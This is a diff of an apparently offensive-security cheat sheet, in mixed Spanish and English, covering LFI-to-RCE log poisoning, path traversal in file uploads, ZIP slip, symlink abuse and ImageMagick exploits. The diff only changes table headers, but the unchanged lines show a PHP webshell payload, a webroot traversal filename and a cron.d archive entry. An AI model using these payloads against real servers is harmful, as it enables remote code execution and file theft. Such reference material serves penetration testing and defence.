@@ -25,7 +25,7 @@ linked:
 
 ## LFI to RCE Chain
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Log poisoning | Inject PHP code en `User-Agent` → access log → LFI to log → execute | Common. |
 | `/var/log/apache2/access.log` poison | `<?php system($_GET['c']); ?>` en UA | Standard. |
@@ -66,7 +66,7 @@ ___
 
 ## Path Traversal en File Upload
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Filename traversal | Upload con filename `../../../var/www/html/sh.php` | Force write to webroot. |
 | Server unescape filename | If server uses unsanitized filename for storage | Direct webshell drop. |
@@ -86,7 +86,7 @@ ___
 
 ## ZIP Slip / Tar Slip / Archive Traversal
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | App extracts archive (zip, tar, etc) sin validating entry paths. Atacante embeds entries con `../` paths. | CVE-2018-8014 (multiple libs). |
 | ZIP entry name | Entry: `../../etc/cron.d/poison` | After extract, lands en `/etc/cron.d/poison`. |
@@ -124,7 +124,7 @@ ___
 
 ## Symlink Abuse
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Concept | Atacante creates symlink en uploaded file or controlled directory. Backend reads symlink target → reads sensitive file. | Local TOCTOU. |
 | Atacante uploads symlink | App extracts archive con symlink → server reads target | ZIP slip variant. |
@@ -145,7 +145,7 @@ ___
 
 ## ImageMagick / File Processors
 
-| **Vector** | **Payload** | **Notas** |
+| **Comando** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | ImageTragick (CVE-2016-3714) | MVG / SVG con `url()` directive | Direct file read + RCE. |
 | Ghostscript injection | PostScript con file ops | Embedded `pipe` directive. |
